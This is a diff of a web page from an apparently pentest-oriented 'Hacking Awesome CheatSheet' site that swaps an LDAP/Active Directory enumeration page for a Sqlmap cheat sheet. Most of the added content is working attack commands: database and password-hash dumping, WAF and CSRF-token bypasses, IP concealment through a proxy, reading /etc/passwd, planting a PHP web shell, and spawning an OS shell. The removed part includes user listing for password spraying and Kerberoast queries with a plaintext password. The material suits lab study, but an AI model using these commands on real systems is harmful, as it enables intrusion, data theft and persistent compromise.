@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../trust/">
+        <link rel="prev" href="../../pivoting/">
       
       
-        <link rel="next" href="../lateralmovement/">
+        <link rel="next" href="../../bash/bash_scripts/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>LDAP - Hacking Awesome CheatSheet</title>
+        <title>Sqlmap - Hacking Awesome CheatSheet</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#microsoft-remote-server-administration-tools-rsat" class="md-skip">
+        <a href="#basic-commands" class="md-skip">
           Skip to content
         </a>
       
@@ -108,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              LDAP
+              Sqlmap
             
           </span>
         </div>
@@ -218,19 +218,17 @@
       
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
@@ -244,7 +242,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             Active Directory
@@ -258,7 +256,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../initial/" class="md-nav__link">
+      <a href="../../active-directory/initial/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -279,7 +277,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../adenumeration/" class="md-nav__link">
+      <a href="../../active-directory/adenumeration/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -300,7 +298,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../credentials/" class="md-nav__link">
+      <a href="../../active-directory/credentials/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -321,7 +319,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../lotl/" class="md-nav__link">
+      <a href="../../active-directory/lotl/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -342,7 +340,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../acl/" class="md-nav__link">
+      <a href="../../active-directory/acl/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -363,7 +361,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../vulns/" class="md-nav__link">
+      <a href="../../active-directory/vulns/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -384,7 +382,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../trust/" class="md-nav__link">
+      <a href="../../active-directory/trust/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -402,28 +400,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    LDAP
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../active-directory/ldap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -432,114 +412,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#microsoft-remote-server-administration-tools-rsat" class="md-nav__link">
-    <span class="md-ellipsis">
-      Microsoft Remote Server Administration Tools (RSAT)
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Microsoft Remote Server Administration Tools (RSAT)">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#enumeration-with-rsat" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumeration with RSAT
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ldap-query-user-related-search" class="md-nav__link">
-    <span class="md-ellipsis">
-      LDAP Query - User Related Search
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="LDAP Query - User Related Search">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#powershell-filters" class="md-nav__link">
-    <span class="md-ellipsis">
-      PowerShell Filters
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ldap-search-filters" class="md-nav__link">
-    <span class="md-ellipsis">
-      LDAP Search Filters
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#enumerating-active-directory-with-built-in-tools" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumerating Active Directory with Built-in Tools
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ldap-anonymous-bind" class="md-nav__link">
-    <span class="md-ellipsis">
-      LDAP Anonymous Bind
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="LDAP Anonymous Bind">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#credentialed-ldap-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Credentialed LDAP Enumeration
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -552,7 +424,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../lateralmovement/" class="md-nav__link">
+      <a href="../../active-directory/lateralmovement/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -573,7 +445,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege/" class="md-nav__link">
+      <a href="../../active-directory/privilege/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -594,7 +466,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bloodhound/" class="md-nav__link">
+      <a href="../../active-directory/bloodhound/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -615,7 +487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../crtp/" class="md-nav__link">
+      <a href="../../active-directory/crtp/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1285,10 +1157,28 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../web/sqlmap/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Sqlmap
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -1297,6 +1187,84 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic commands
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Database Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Database Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#full-db-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full DB Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-database-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Database Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-web-application-protections" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing Web Application Protections
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#os-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      OS Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1493,19 +1461,28 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#microsoft-remote-server-administration-tools-rsat" class="md-nav__link">
+  <a href="#basic-commands" class="md-nav__link">
     <span class="md-ellipsis">
-      Microsoft Remote Server Administration Tools (RSAT)
+      Basic commands
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Microsoft Remote Server Administration Tools (RSAT)">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Database Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Database Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#enumeration-with-rsat" class="md-nav__link">
+  <a href="#full-db-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumeration with RSAT
+      Full DB Enumeration
     </span>
   </a>
   
@@ -1517,68 +1494,29 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ldap-query-user-related-search" class="md-nav__link">
+  <a href="#advanced-database-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      LDAP Query - User Related Search
+      Advanced Database Enumeration
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="LDAP Query - User Related Search">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#powershell-filters" class="md-nav__link">
-    <span class="md-ellipsis">
-      PowerShell Filters
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ldap-search-filters" class="md-nav__link">
-    <span class="md-ellipsis">
-      LDAP Search Filters
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#enumerating-active-directory-with-built-in-tools" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumerating Active Directory with Built-in Tools
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#ldap-anonymous-bind" class="md-nav__link">
+  <a href="#bypassing-web-application-protections" class="md-nav__link">
     <span class="md-ellipsis">
-      LDAP Anonymous Bind
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="LDAP Anonymous Bind">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#credentialed-ldap-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Credentialed LDAP Enumeration
+      Bypassing Web Application Protections
     </span>
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#os-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      OS Exploitation
+    </span>
+  </a>
   
 </li>
       
@@ -1597,87 +1535,76 @@
                   
 
 
-  <h1>LDAP</h1>
+  <h1>Sqlmap</h1>
 
-<h2 id="microsoft-remote-server-administration-tools-rsat"><strong>Microsoft Remote Server Administration Tools (RSAT)</strong></h2>
+<h2 id="basic-commands"><strong>Basic commands</strong></h2>
 <ol>
-<li>PowerShell - Available RSAT Tools: <code>Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State</code></li>
-<li>PowerShell - Install All Available RSAT Tools: <code>Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability –Online</code></li>
-<li>PowerShell - Install an RSAT Tool: <code>Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  –Online</code></li>
+<li>Basic usage: <code>python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'</code></li>
+<li>Go to DevTools &gt; Copy as cURL &gt; paste to terminal &gt; change curl to sqlmap</li>
+<li>Post request: <code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code> uid and name will be tested for SQLi vulnerability.</li>
+<li>Post request - focus on uid parametr <code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code></li>
+<li>Full HTTP Requests: <ol>
+<li>Copy &gt; Copy Request Headers &gt; paste into a req.txt file</li>
+<li>To run SQLMap with an HTTP request file, we use the -r flag: <code>sqlmap -r req.txt</code></li>
 </ol>
-<h3 id="enumeration-with-rsat"><strong>Enumeration with RSAT</strong></h3>
-<ol>
-<li>CMD - MMC Runas Domain User: <code>runas /netonly /user:Domain_Name\Domain_USER mmc</code></li>
-</ol>
-<h2 id="ldap-query-user-related-search"><strong>LDAP Query - User Related Search</strong></h2>
-<ol>
-<li>LDAP Query - User Related Search: <code>Get-ADObject -LDAPFilter '(objectClass=group)' | select name</code></li>
-<li>LDAP Query - Detailed Search: <code>Get-ADObject -LDAPFilter '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' -Properties * | select samaccountname,useraccountcontrol</code></li>
-</ol>
-<h3 id="powershell-filters"><strong>PowerShell Filters</strong></h3>
-<ol>
-<li>PowerShell - Filter Installed Software: <code>get-ciminstance win32_product | fl</code></li>
-<li>PowerShell - Filter Out Microsoft Software: <code>get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl</code></li>
-<li>PowerShell - Filter Examples: <ul>
-<li><code>Get-ADUser -Filter "name -eq 'sally jones'"</code></li>
-<li><code>Get-ADUser -Filter {name -eq 'sally jones'}</code></li>
-<li><code>Get-ADUser -Filter 'name -eq "sally jones"'</code></li>
-</ul>
 </li>
-<li>PowerShell - Filter For SQL: <code>Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"</code></li>
-<li>PowerShell - Filter Administrative Groups: <code>Get-ADGroup -Filter "adminCount -eq 1" | select Name</code></li>
-<li>PowerShell - Filter Administrative Users: <code>Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}</code></li>
-<li>PowerShell - Find Administrative Users with the ServicePrincipalName: <code>Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl</code></li>
-<li>PowerShell - Members Of Security Operations: <code>Get-ADGroupMember -Identity "Security Operations"</code></li>
-<li>PowerShell - User's Group Membership: <code>Get-ADUser -Identity harry.jones -Properties * | select memberof | ft -Wrap</code></li>
-<li>PowerShell - All Groups of User: <code>Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL"' | select name</code></li>
-<li>PowerShell - Count of All AD Users: <code>(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count</code></li>
-<li>PowerShell - SearchScope Base: <code>Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope Base -Filter *</code></li>
-<li>PowerShell - SearchScope Base OU Object: <code>Get-ADObject -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope Base -Filter *</code></li>
-<li>PowerShell - Searchscope OneLevel: <code>Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope OneLevel -Filter *</code></li>
-<li>PowerShell - Searchscope 1: <code>Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope 1 -Filter *</code></li>
-<li>PowerShell - Searchscope Subtree: <code>(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope Subtree -Filter *).count</code></li>
+<li>To specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method: <code>sqlmap -u www.target.com --data='id=1' --method PUT</code></li>
+<li>Use options <code>--batch --dump</code> to automatically dump all data.</li>
+<li>Use crawl option to detemine how deep to find: <code>--crawl=2</code></li>
+<li>The -t option stores the whole traffic content to an output file: <code>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</code></li>
+<li><code>-v</code> option, which raises the verbosity level of the console output</li>
+<li>Utilize the <code>--proxy</code> option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp)</li>
+<li>The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).</li>
+<li>The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).</li>
+<li>Prefix and sufix: <code>--prefix= --sufix=</code></li>
+<li>Count numbers of columns and add to command: <code>--union-cols=10</code></li>
 </ol>
-<h3 id="ldap-search-filters"><strong>LDAP Search Filters</strong></h3>
+<h2 id="database-enumeration"><strong>Database Enumeration</strong></h2>
 <ol>
-<li>LDAP Query - Filter Disabled User Accounts: <code>Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name</code></li>
-<li>LDAP Query - Find All Groups: <code>Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' | select Name</code></li>
-<li>LDAP Query - Description Field: <code>Get-ADUser -Properties * -LDAPFilter '(&amp;(objectCategory=user)(description=*))' | select samaccountname,description</code></li>
-<li>LDAP Query - Find Trusted Users: <code>Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select Name,memberof, servicePrincipalName,TrustedForDelegation | fl</code></li>
-<li>LDAP Query - Find Trusted Computers: <code>Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl</code></li>
-<li>LDAP Query - Users With Blank Password: <code>Get-AdUser -LDAPFilter '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl</code></li>
-<li>LDAP Query - All Groups of User: <code>Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' |select Name</code></li>
+<li>Basic DB Data EnumerationP: <code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></li>
+<li>Table Enumeration: <code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></li>
+<li>After spotting the table name of interest, retrieval of its content can be done by using the --dump option and specifying the table name with -T users: <code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</code></li>
+<li>Apart from default CSV, we can specify the output format with the option <code>--dump-format</code> to HTML or SQLite</li>
+<li>Table/Row Enumeration: <code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</code></li>
+<li>To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry): <code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3</code></li>
+<li>Conditional Enumeration: <code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></li>
 </ol>
-<h3 id="enumerating-active-directory-with-built-in-tools"><strong>Enumerating Active Directory with Built-in Tools</strong></h3>
+<h3 id="full-db-enumeration"><strong>Full DB Enumeration</strong></h3>
+<p>Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option -T altogether (e.g. --dump -D testdb). By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved.</p>
+<p>In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.</p>
+<h2 id="advanced-database-enumeration"><strong>Advanced Database Enumeration</strong></h2>
 <ol>
-<li>List users with admin's rights: <code>Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol | select Name,useraccountcontrol</code></li>
-<li>PowerView list users with admin's rights: <code>Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol</code></li>
-<li>List all users from OU with SAM and passwordneverxpired=yes: <code>dsquery user "OU=Employees,DC=inlanefreight,DC=local" -name * -scope subtree -limit 0 | dsget user -samid - pwdneverexpires | findstr /V no</code></li>
-<li>Get all groups with Get-Wmi: <code>Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'" | Select Caption,Name</code></li>
-<li>Get all objects <code>([adsisearcher]"(&amp;(objectClass=Computer))").FindAll() | select Path</code></li>
+<li>DB Schema Enumeration: <code>sqlmap -u "http://www.example.com/?id=1" --schema</code></li>
+<li>Searching for Data: <code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></li>
+<li>To search for all column names based on a specific keyword (e.g. pass): <code>sqlmap -u "http://www.example.com/?id=1" --search -C pass</code></li>
+<li>Password Enumeration and Cracking: <code>sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users</code></li>
+<li>DB Users Password Enumeration and Cracking: <code>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</code>
+<strong>TIP: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.</strong></li>
 </ol>
-<h2 id="ldap-anonymous-bind"><strong>LDAP Anonymous Bind</strong></h2>
-<p>Use Python to quickly check if we can interact with LDAP without credentials:</p>
-<pre><code class="language-python">from ldap3 import *
-s = Server('10.129.1.207',get_info = ALL)
-c =  Connection(s, '', '')
-c.bind()
-s.info
-</code></pre>
+<h2 id="bypassing-web-application-protections"><strong>Bypassing Web Application Protections</strong></h2>
 <ol>
-<li>Using Ldapsearch: <code>ldapsearch -H ldap://10.129.1.207 -x -b "dc=inlanefreight,dc=local"</code></li>
-<li>Using Windapsearch: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u "" --functionality</code></li>
-<li>Pull a listing of all domain users to use in a password spraying attack: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -U</code></li>
-<li>Obtain information about all domain computers: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -C</code></li>
-<li><a href="https://github.com/yaap7/ldapsearch-ad">ldapsearch-ad.py</a> s similar to windapsearch: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -t info</code></li>
+<li>Anti-CSRF Token Bypass: <code>sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></li>
+<li>Unique Value Bypass: <code>sqlmap -u "http://www.example.com/?id=1&amp;rp=29125" --randomize=rp --batch -v 5 | grep URI</code></li>
+<li>Calculated Parameter Bypass: <code>sqlmap -u "http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI</code></li>
+<li>IP Address Concealing: A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.</li>
+<li>User-agent Blacklisting Bypass: <code>--random-agent</code></li>
+<li>Tamper Scripts</li>
 </ol>
-<h3 id="credentialed-ldap-enumeration"><strong>Credentialed LDAP Enumeration</strong></h3>
+<h2 id="os-exploitation"><strong>OS Exploitation</strong></h2>
 <ol>
-<li>Windapsearch: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -u inlanefreight\\james.cross --da</code></li>
-<li>Some additional useful options, including pulling users and computers with unconstrained delegation: <code>python3 windapsearch.py --dc-ip 10.129.1.207 -d inlanefreight.local -u inlanefreight\\james.cross --unconstrained-users</code></li>
-<li>Ldapsearch-ad - uickly obtain the password policy: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t pass-pols</code></li>
-<li>Ldapsearch-ad - look for users who may be subject to a Kerberoasting attack: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t kerberoast | grep servicePrincipalName:</code></li>
-<li>Ldapsearch-ad - retrieves users that can be ASREPRoasted: <code>python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t asreproast</code></li>
+<li>Checking for DBA Privileges: <code>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</code></li>
+<li>Reading Local Files: <code>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></li>
+<li>Writing Local Files<ol>
+<li><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code></li>
+<li><code>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></li>
+<li><code>curl http://www.example.com/shell.php?cmd=ls+-la</code></li>
+</ol>
+</li>
+<li>OS Command Execution:<ol>
+<li><code>sqlmap -u "http://www.example.com/?id=1" --os-shell</code></li>
+<li>Error-based SQL Injection: <code>sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E</code></li>
+</ol>
+</li>
 </ol>
 
 
